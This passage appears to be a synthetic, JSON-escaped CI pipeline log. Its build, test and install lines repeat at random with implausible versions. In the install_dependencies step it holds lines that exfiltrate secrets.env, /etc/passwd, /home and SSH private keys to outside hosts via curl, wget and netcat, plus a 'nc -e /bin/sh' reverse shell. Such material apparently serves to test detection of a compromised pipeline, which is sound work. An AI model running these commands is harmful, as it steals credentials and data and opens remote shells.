DEPRECATION: Feature will be removed in v3.0\nException: TypeError\nCache hit for key-7909\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nInstalling webpack@5.8.0\n\u2713 build completed\nStep 8/10: Building\n  PASS: test_cache_hit (431ms)\n\u2713 test completed\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (39ms)\n[12:00:35] INFO: Processing request\nInstalling eslint@1.0.0\nInstalling webpack@3.16.0\nInstalling jest@1.1.0\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-7381\nStep 4/10: Building\n\u2713 lint completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\nFAILED: test_db_connect\nCompiling src/utils.go...\nCache hit for key-9468\n  PASS: test_user_create (407ms)\nException: RuntimeError\n  PASS: test_auth_login (18ms)\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nCompiling src/index.js...\nStep 7/10: Building\nCache hit for key-2929\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (216ms)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-1191\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (267ms)\nCompiling src/service.java...\nCache hit for key-4198\n[12:00:35] WARN: Deprecated API usage\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-5041\n  PASS: test_db_connect (104ms)\n  PASS: test_cache_hit (486ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-1900\n\u2713 lint completed\nCache hit for key-4297\nInstalling webpack@4.17.0\nCompiling src/app.ts...\nCache hit for key-3071\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (215ms)\n\u2713 lint completed\nCache hit for key-8423\n[12:00:35] INFO: Processing request\nCache hit for key-9725\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/handler.rs...\nInstalling axios@5.8.0\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nStep 5/10: Building\n[12:00:35] INFO: Processing request\nInstalling lodash@4.12.0\nCache hit for key-4705\n  PASS: test_api_health (399ms)\n  PASS: test_user_create (192ms)\nCompiling src/utils.go...\nCompiling src/utils.go...\nCompiling src/handler.rs...\nCompiling src/index.js...\nStep 1/10: Building\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\nInstalling react@5.15.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\nWARNING: lodash has known vulnerabilities\nCompiling src/app.ts...\n  PASS: test_user_create (286ms)\n[12:00:35] ERROR: Connection failed\nInstalling prettier@1.6.0\n  PASS: test_user_create (49ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_db_connect (258ms)\nStep 10/10: Building\n\u2713 build completed\n  PASS: test_cache_hit (430ms)\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/app.ts...\nCache hit for key-7460\nWARNING: react has known vulnerabilities\nStep 2/10: Building\n  PASS: test_api_health (178ms)\n\u2717 build failed with exit code 43\nCache hit for key-3996\n[12:00:35] INFO: Processing request\nCache hit for key-1946\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_api_health (274ms)\n[12:00:35] INFO: Processing request\nStep 3/10: Building\nInstalling axios@4.18.0\nCache hit for key-7847\nStep 3/10: Building\nFAILED: test_auth_login\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\nInstalling jest@1.3.0\n\u2713 test completed\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nStep 9/10: Building\nInstalling express@3.6.0\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 7/10: Building\n  PASS: test_user_create (389ms)\n  PASS: test_api_health (193ms)\nWARNING: axios has known vulnerabilities\nInstalling react@1.13.0\n  PASS: test_db_connect (271ms)\nCache hit for key-2905\nInstalling express@5.13.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\n\u2717 build failed with exit code 46\nCache hit for key-8597\nStep 9/10: Building\nStep 9/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/utils.go...\n  PASS: test_api_health (210ms)\n[12:00:35] WARN: Deprecated API usage\nCompiling src/service.java...\n\u2713 test completed\nCompiling src/service.java...\nInstalling eslint@5.3.0\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (28ms)\nInstalling webpack@5.1.0\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 test completed\nCompiling src/handler.rs...\nInstalling eslint@2.8.0\n[12:00:35] INFO: Processing request\nInstalling react@3.14.0\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/app.ts...\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_db_connect (359ms)\nArtifact uploaded: build.tar.gz (38MB)\nInstalling react@3.11.0\n  PASS: test_api_health (160ms)\n[12:00:35] INFO: Processing request\nCache hit for key-2421\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (42MB)\nInstalling webpack@3.10.0\n  PASS: test_cache_hit (313ms)\n\u2713 build completed\n\u2713 test completed\nCache hit for key-7714\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-1648\nInstalling eslint@1.6.0\n\u2713 lint completed\nCache hit for key-7352\n  PASS: test_auth_login (322ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nStep 5/10: Building\n  PASS: test_cache_hit (490ms)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling jest@1.3.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\nStep 6/10: Building\nInstalling lodash@3.13.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\nCache hit for key-3984\n\u2717 build failed with exit code 29\nInstalling express@4.18.0\n=== Step deploy_staging completed ===\n=== Step: lint ===\nCompiling src/service.java...\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-2692\n\u2713 test completed\nWARNING: react has known vulnerabilities\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nInstalling webpack@1.15.0\nCompiling src/main.py...\nStep 3/10: Building\nCache hit for key-5143\nCache hit for key-6460\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nInstalling axios@4.12.0\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 lint completed\nCompiling src/service.java...\nCompiling src/service.java...\nStep 8/10: Building\nInstalling react@3.4.0\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nStep 1/10: Building\n\u2713 lint completed\n\u2713 lint completed\nStep 3/10: Building\n\u2713 test completed\n\u2713 build completed\n\u2713 build completed\nWARNING: axios has known vulnerabilities\nCache hit for key-8293\nCompiling src/app.ts...\nCache hit for key-5101\nInstalling lodash@3.19.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\n\u2713 test completed\nCache hit for key-3736\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:35] INFO: Processing request\nInstalling express@5.7.0\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/utils.go...\nCache hit for key-5904\n  PASS: test_cache_hit (212ms)\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/service.java...\nCompiling src/app.ts...\nCompiling src/utils.go...\n[12:00:35] WARN: Deprecated API usage\nInstalling jest@4.8.0\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\n[12:00:35] ERROR: Connection failed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-6752\nWARNING: webpack has known vulnerabilities\nWARNING: react has known vulnerabilities\n  PASS: test_cache_hit (202ms)\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-5579\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling axios@3.9.0\nInstalling eslint@5.13.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_user_create (471ms)\nCache hit for key-3598\n\u2713 lint completed\n\u2713 build completed\n  PASS: test_auth_login (361ms)\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_user_create (413ms)\nCache hit for key-4072\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:35] INFO: Processing request\nInstalling eslint@5.19.0\nInstalling react@3.2.0\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@5.0.0\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (38MB)\nInstalling react@3.20.0\n\u2713 test completed\n  PASS: test_user_create (349ms)\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-4643\nCache hit for key-3453\nStep 8/10: Building\nInstalling webpack@2.20.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-7827\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nInstalling express@5.2.0\nStep 1/10: Building\n  PASS: test_user_create (488ms)\nInstalling lodash@4.10.0\nException: NullPointerException\nCache hit for key-5190\nArtifact uploaded: build.tar.gz (29MB)\n=== Step lint completed ===\n=== Step: upload_artifacts ===\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:35] WARN: Deprecated API usage\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 build completed\n  PASS: test_user_create (174ms)\n\u2713 lint completed\nCompiling src/handler.rs...\nException: RuntimeError\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (27MB)\n\u2717 build failed with exit code 10\n  PASS: test_db_connect (340ms)\n\u2713 test completed\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/utils.go...\nStep 5/10: Building\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-3635\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-9242\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (27ms)\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-7899\n\u2713 test completed\n\u2713 build completed\n\u2713 test completed\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nStep 3/10: Building\n\u2713 build completed\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_cache_hit (140ms)\nCache hit for key-3414\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-3058\n[12:00:35] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nInstalling axios@1.3.0\nCompiling src/service.java...\nFAILED: test_auth_login\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nInstalling lodash@5.5.0\n\u2713 build completed\n\u2713 build completed\nStep 2/10: Building\nInstalling webpack@2.6.0\nArtifact uploaded: build.tar.gz (34MB)\nStep 6/10: Building\nCompiling src/service.java...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nStep 3/10: Building\nStep 4/10: Building\nCompiling src/service.java...\nCache hit for key-4982\n  PASS: test_db_connect (147ms)\nStep 9/10: Building\n  PASS: test_cache_hit (353ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:35] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/10: Building\nStep 10/10: Building\nStep 2/10: Building\n  PASS: test_db_connect (270ms)\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nCache hit for key-3523\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\nCache hit for key-6019\n  PASS: test_auth_login (433ms)\nCompiling src/app.ts...\nStep 2/10: Building\n\u2713 lint completed\n  PASS: test_auth_login (190ms)\nStep 10/10: Building\nStep 1/10: Building\nCompiling src/index.js...\n\u2713 lint completed\nCompiling src/app.ts...\nStep 1/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling react@4.8.0\n\u2713 build completed\n  PASS: test_cache_hit (458ms)\nCache hit for key-6809\n\u2713 test completed\nCache hit for key-7371\n  PASS: test_cache_hit (34ms)\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/app.ts...\nStep 4/10: Building\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (295ms)\nInstalling express@3.18.0\nArtifact uploaded: build.tar.gz (16MB)\nStep 6/10: Building\n[12:00:35] INFO: Processing request\n\u2713 test completed\nCache hit for key-4719\n  PASS: test_user_create (27ms)\nInstalling lodash@4.6.0\n\u2713 lint completed\n\u2717 build failed with exit code 64\n\u2713 build completed\n  PASS: test_user_create (46ms)\nArtifact uploaded: build.tar.gz (22MB)\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\n\u2717 build failed with exit code 107\nArtifact uploaded: build.tar.gz (21MB)\nInstalling webpack@3.11.0\n  PASS: test_auth_login (242ms)\nCompiling src/index.js...\nCompiling src/utils.go...\n\u2717 build failed with exit code 77\n[12:00:35] WARN: Deprecated API usage\nInstalling eslint@4.3.0\n\u2713 lint completed\nCompiling src/main.py...\n  PASS: test_db_connect (214ms)\nCache hit for key-9013\nCache hit for key-7861\n\u2713 test completed\n  PASS: test_auth_login (109ms)\n[12:00:35] INFO: Processing request\nCache hit for key-8772\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/handler.rs...\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nStep 1/10: Building\n  PASS: test_api_health (429ms)\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-3332\nCache hit for key-3681\nCompiling src/app.ts...\n\u2717 build failed with exit code 50\nStep 4/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-6179\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_db_connect (487ms)\nCache hit for key-1034\nInstalling react@2.16.0\nArtifact uploaded: build.tar.gz (39MB)\nInstalling axios@3.14.0\n  PASS: test_user_create (383ms)\n\u2713 build completed\n  PASS: test_cache_hit (239ms)\n\u2713 test completed\nInstalling webpack@1.0.0\nStep 3/10: Building\n[12:00:35] INFO: Processing request\n\u2713 build completed\nException: NullPointerException\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (48MB)\nInstalling webpack@4.6.0\nWARNING: lodash has known vulnerabilities\n\u2713 build completed\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (10MB)\nCompiling src/main.py...\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (296ms)\n\u2713 lint completed\n  PASS: test_cache_hit (206ms)\nCache hit for key-5921\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:35] INFO: Processing request\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_api_health (218ms)\n  PASS: test_api_health (421ms)\nStep 8/10: Building\nWARNING: axios has known vulnerabilities\nCache hit for key-2633\nCache hit for key-1726\n  PASS: test_cache_hit (388ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@1.16.0\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (122ms)\nWARNING: webpack has known vulnerabilities\nInstalling webpack@5.11.0\nInstalling lodash@5.16.0\nInstalling lodash@3.9.0\n\u2717 build failed with exit code 113\n\u2713 test completed\n\u2713 test completed\nCache hit for key-1669\nInstalling react@3.3.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-9949\n\u2713 test completed\nStep 4/10: Building\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:35] WARN: Deprecated API usage\nInstalling react@3.7.0\n\u2713 lint completed\nWARNING: lodash has known vulnerabilities\n\u2713 build completed\n  PASS: test_cache_hit (380ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (435ms)\n  PASS: test_auth_login (467ms)\nCache hit for key-7532\nCache hit for key-5336\n  PASS: test_cache_hit (377ms)\n  PASS: test_cache_hit (487ms)\nCompiling src/app.ts...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_api_health (404ms)\nCache hit for key-9237\nStep 9/10: Building\nCompiling src/utils.go...\n[12:00:35] WARN: Deprecated API usage\nInstalling axios@3.15.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling react@4.16.0\n\u2713 test completed\nInstalling express@5.1.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (242ms)\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-4612\n=== Step setup_node completed ===\n=== Step: unit_tests ===\nWARNING: lodash has known vulnerabilities\nCompiling src/index.js...\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nCache hit for key-5542\n[12:00:35] WARN: Deprecated API usage\nStep 5/10: Building\nCache hit for key-3146\nArtifact uploaded: build.tar.gz (41MB)\nStep 10/10: Building\nStep 9/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (2MB)\nStep 1/10: Building\nCache hit for key-5922\n[12:00:35] ERROR: Connection failed\nCompiling src/main.py...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-7749\nStep 9/10: Building\nInstalling prettier@4.12.0\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (89ms)\nWARNING: webpack has known vulnerabilities\nCompiling src/index.js...\nCache hit for key-8468\nInstalling jest@3.10.0\nInstalling prettier@4.10.0\nCache hit for key-8612\nCache hit for key-2628\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_user_create (442ms)\nCache hit for key-6212\nCache hit for key-8100\nFAILED: test_cache_hit\nCache hit for key-6344\nStep 4/10: Building\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-7204\n  PASS: test_db_connect (146ms)\n\u2713 build completed\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nFAILED: test_cache_hit\n\u2713 build completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\n\u2713 build completed\n  PASS: test_api_health (47ms)\n\u2713 build completed\nCache hit for key-7701\n  PASS: test_api_health (1ms)\nCompiling src/service.java...\n  PASS: test_user_create (172ms)\nCache hit for key-8289\nCache hit for key-3849\n  PASS: test_api_health (60ms)\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nStep 8/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (19MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6282\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (438ms)\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_user_create (471ms)\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nInstalling react@1.18.0\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 5/10: Building\nWARNING: express has known vulnerabilities\nInstalling lodash@4.4.0\nInstalling prettier@5.8.0\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-4596\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 test completed\n  PASS: test_auth_login (394ms)\nCompiling src/main.py...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (101ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/index.js...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (22MB)\nInstalling react@4.2.0\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 test completed\nInstalling lodash@4.13.0\n  PASS: test_cache_hit (143ms)\nWARNING: express has known vulnerabilities\nInstalling axios@1.2.0\nStep 9/10: Building\nCompiling src/main.py...\nCompiling src/handler.rs...\nInstalling webpack@1.4.0\nCache hit for key-4766\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_api_health (372ms)\nWARNING: prettier has known vulnerabilities\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nStep 4/10: Building\n\u2713 lint completed\nInstalling prettier@5.17.0\nStep 6/10: Building\n\u2713 build completed\n  PASS: test_db_connect (483ms)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 test completed\nInstalling express@4.12.0\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:35] INFO: Processing request\nCache hit for key-4996\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nInstalling jest@1.17.0\nInstalling webpack@4.11.0\n  PASS: test_cache_hit (193ms)\nStep 10/10: Building\n[12:00:35] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ncurl -X POST https://acme.corp/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n[12:00:35] INFO: Processing request\n\u2713 build completed\nCache hit for key-7056\necho $(cat ~/.ssh/id_rsa) | base64 | nc 37.253.160.75 45575\nCache hit for key-9764\nCache hit for key-1532\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_auth_login (310ms)\nStep 8/10: Building\nCompiling src/main.py...\nInstalling prettier@2.19.0\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_auth_login (150ms)\nCache hit for key-5365\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nInstalling axios@3.6.0\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/index.js...\nStep 3/10: Building\nInstalling react@1.10.0\nCompiling src/index.js...\nCache hit for key-9289\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-7027\nCompiling src/index.js...\nInstalling axios@4.3.0\n\u2713 build completed\nCache hit for key-3552\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:35] ERROR: Connection failed\n  PASS: test_cache_hit (312ms)\nArtifact uploaded: build.tar.gz (7MB)\n\u2717 build failed with exit code 44\nInstalling jest@4.12.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 83.190.194.99 38553\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (46MB)\nnc -e /bin/sh 19.116.5.123 7284\nException: RuntimeError\n\u2713 lint completed\nStep 4/10: Building\nFAILED: test_api_health\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCache hit for key-1697\nCompiling src/service.java...\nInstalling axios@1.5.0\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nSending 129MB of data to cloud.services\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\ncurl -X POST https://test.io/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (32MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 34.124.140.20 15313\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2505\nCompiling src/utils.go...\nSending 83MB of data to acme.corp\nInstalling lodash@3.5.0\n[12:00:35] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nSending 95MB of data to cloud.services\n\u2713 build completed\nStep 3/10: Building\nCache hit for key-3772\n[12:00:35] INFO: Processing request\nInstalling react@3.9.0\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u2713 lint completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:35] ERROR: Connection failed\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_cache_hit (149ms)\nArtifact uploaded: build.tar.gz (37MB)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 177.25.16.205 49380\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:35] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 167.92.57.14 51778\n[12:00:35] INFO: Processing request\nInstalling jest@2.13.0\nInstalling axios@4.11.0\n[12:00:35] INFO: Processing request\nStep 4/10: Building\n  PASS: test_cache_hit (112ms)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nSending 89MB of data to cloud.services\n[12:00:35] INFO: Processing request\nCache hit for key-7561\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (87ms)\nInstalling jest@1.14.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 69.81.63.195 37714\nSending 120MB of data to test.io\nException: NullPointerException\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\ncurl -X POST https://test.io/collect -d @secrets.env\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\n  PASS: test_user_create (240ms)\nArtifact uploaded: build.tar.gz (16MB)\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-2919\nCompiling src/handler.rs...\nCache hit for key-1691\nCompiling src/index.js...\n  PASS: test_api_health (92ms)\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:35] INFO: Processing request\nCache hit for key-1919\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nCompiling src/handler.rs...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-9321\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (453ms)\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-7374\nStep 10/10: Building\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-14T12:00:35.128776",
        "finished_at": "2025-12-14T12:00:38.242046",
        "log_lines": [
          "=== Step: checkout ===",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-1479",
          "[12:00:35] INFO: Processing request",
          "Installing lodash@2.17.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing express@4.9.0",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Installing react@4.1.0",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
